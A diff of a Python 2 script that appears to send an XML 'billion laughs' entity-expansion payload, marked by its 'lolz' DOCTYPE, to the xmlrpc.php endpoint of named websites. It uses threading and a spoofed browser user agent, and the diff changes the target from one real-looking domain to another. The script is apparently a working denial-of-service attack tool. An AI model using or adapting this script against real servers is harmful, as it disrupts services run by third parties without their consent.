@@ -1,9 +1,9 @@
-#!/usr/bin/env python
 from __future__ import print_function
 import threading
 import time
 import urllib
 import urllib2
+import random
 
 
 data = """<?xml version="1.0" encoding="iso-8859-1"?><!DOCTYPE lolz [
@@ -16,7 +16,7 @@ data = """<?xml version="1.0" encoding="iso-8859-1"?><!DOCTYPE lolz [
    <param><value>aa</value></param>
   </params>
 </methodCall>"""
-req = urllib2.Request('http://qiumeimei.com/xmlrpc.php', data)
+req = urllib2.Request('http://www.etgif.com/xmlrpc.php', data)
 req.add_header('Accept', '*/*')
 req.add_header('User-Agent', 'Mozilla/5.0 (Wihndows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0')
 req.add_header('Connection', '')
